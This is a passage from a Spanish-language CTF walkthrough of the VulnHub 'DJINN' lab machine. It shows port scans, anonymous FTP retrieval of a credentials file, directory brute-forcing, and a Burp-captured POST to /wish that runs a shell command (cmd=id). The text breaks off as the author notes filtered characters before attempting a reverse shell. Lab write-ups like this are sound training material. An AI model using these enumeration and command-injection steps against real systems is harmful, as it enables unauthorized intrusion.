# DJINN
Desarrollo del CTF DJINN

## 1. Configuración de la VM

- Descarga de la VM: https://www.vulnhub.com/entry/djinn-1,397/
- La VM funciona bien en VmWare

## 2. Escaneo de Puertos

```
# Nmap 7.91 scan initiated Sun Apr 18 11:27:05 2021 as: nmap -n -P0 -p- -sC -sV -O -T5 -oA full 10.10.10.160
Nmap scan report for 10.10.10.160
Host is up (0.00068s latency).
Not shown: 65531 closed ports
PORT     STATE    SERVICE VERSION
21/tcp   open     ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| -rw-r--r--    1 0        0              11 Oct 20  2019 creds.txt
| -rw-r--r--    1 0        0             128 Oct 21  2019 game.txt
|_-rw-r--r--    1 0        0             113 Oct 21  2019 message.txt
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.10.10.131
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 4
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp   filtered ssh
1337/tcp open     waste?
| fingerprint-strings: 
|   NULL: 
|     ____ _____ _ 
|     ___| __ _ _ __ ___ ___ |_ _(_)_ __ ___ ___ 
|     \x20/ _ \x20 | | | | '_ ` _ \x20/ _ \n| |_| | (_| | | | | | | __/ | | | | | | | | | __/
|     ____|__,_|_| |_| |_|___| |_| |_|_| |_| |_|___|
|     Let's see how good you are with simple maths
|     Answer my questions 1000 times and I'll give you your gift.
|     '-', 9)
|   RPCCheck: 
|     ____ _____ _ 
|     ___| __ _ _ __ ___ ___ |_ _(_)_ __ ___ ___ 
|     \x20/ _ \x20 | | | | '_ ` _ \x20/ _ \n| |_| | (_| | | | | | | __/ | | | | | | | | | __/
|     ____|__,_|_| |_| |_|___| |_| |_|_| |_| |_|___|
|     Let's see how good you are with simple maths
|     Answer my questions 1000 times and I'll give you your gift.
|_    '+', 5)
7331/tcp open     http    Werkzeug httpd 0.16.0 (Python 2.7.15+)
|_http-server-header: Werkzeug/0.16.0 Python/2.7.15+
|_http-title: Lost in space
```

<img src="https://github.com/El-Palomo/DJINN/blob/main/dj1.jpg" width=80% />

## 3. Enumeración

### 3.1. Enumeración FTP

- FTP permite acceso anónimo. Descargamos los archivos y vemos lo que tenemos.

```
root@kali:~/DJINN# ftp 10.10.10.160
Connected to 10.10.10.160.
220 (vsFTPd 3.0.3)
Name (10.10.10.160:kali): anonymous
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
-rw-r--r--    1 0        0              11 Oct 20  2019 creds.txt
-rw-r--r--    1 0        0             128 Oct 21  2019 game.txt
-rw-r--r--    1 0        0             113 Oct 21  2019 message.txt
226 Directory send OK.
ftp> exit
221 Goodbye.
root@kali:~/DJINN# cat creds.txt
nitu:81299
root@kali:~/DJINN# cat game.txt
oh and I forgot to tell you I've setup a game for you on port 1337. See if you can reach to the 
final level and get the prize.
root@kali:~/DJINN# cat message.txt
@nitish81299 I am going on holidays for few days, please take care of all the work. 
And don't mess up anything.
```

<img src="https://github.com/El-Palomo/DJINN/blob/main/dj2.jpg" width=80% />


- En resumen al parecer tenemos alguna credencial: "nitu:81299", nos hablan del puerto 1337 abierto y de un usuario "nitish81299". Tomamos nota.

### 3.2. Enumeración TCP/1337
 
- Encontramos un pequeño juego matemático. Intenté realizar alguna inyección sin exito.

```
root@kali:~/DJINN# nc 10.10.10.160 1337
  ____                        _____ _                
 / ___| __ _ _ __ ___   ___  |_   _(_)_ __ ___   ___ 
| |  _ / _` | '_ ` _ \ / _ \   | | | | '_ ` _ \ / _ \
| |_| | (_| | | | | | |  __/   | | | | | | | | |  __/
 \____|\__,_|_| |_| |_|\___|   |_| |_|_| |_| |_|\___|
                                                     

Let's see how good you are with simple maths
Answer my questions 1000 times and I'll give you your gift.
(3, '*', 2)
> 6
(4, '-', 8)
> 
```

### 3.3. Enumeración HTTP TCP 7331

```
root@kali:~/tools/dirsearch# python3 dirsearch.py -u http://10.10.10.160:7331/ -t 16 -r -e txt,html,php,asp,aspx,jsp -f -w /usr/share/seclists/Discovery/Web-Content/big.txt

  _|. _ _  _  _  _ _|_    v0.4.1
 (_||| _) (/_(_|| (_| )

Extensions: txt, html, php, asp, aspx, jsp | HTTP method: GET | Threads: 16 | Wordlist size: 163783

Error Log: /root/tools/dirsearch/logs/errors-21-04-18_12-51-02.log

Target: http://10.10.10.160:7331/

Output File: /root/tools/dirsearch/reports/10.10.10.160/_21-04-18_12-51-02.txt

[12:51:02] Starting: 
[12:53:41] 200 -    2KB - /genie
[12:57:30] 200 -  385B  - /wish
```

<img src="https://github.com/El-Palomo/DJINN/blob/main/dj3.jpg" width=80% />


- Encontramos un script que nos permite ejecutar comandos. Vamos bien.


## 4. Obteniendo SHELL

- Ya que tenemos un script vamos a intentar obtener una shell reversa, sin embargo, obtenemos mensajes de error. Antes de eso lo pasamos por el BURP.

```
POST /wish HTTP/1.1
Host: 10.10.10.160:7331
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://10.10.10.160:7331/wish
Content-Type: application/x-www-form-urlencoded
Content-Length: 6
Connection: close
Upgrade-Insecure-Requests: 1

cmd=id
```

<img src="https://github.com/El-Palomo/DJINN/blob/main/dj4.jpg" width=80% />

- Todo parece fácil, sin embargo, algunos caracteres no estaban permitidos y eso limitada las operaciones: el punto (.), asterisco (*) y slash (/) 







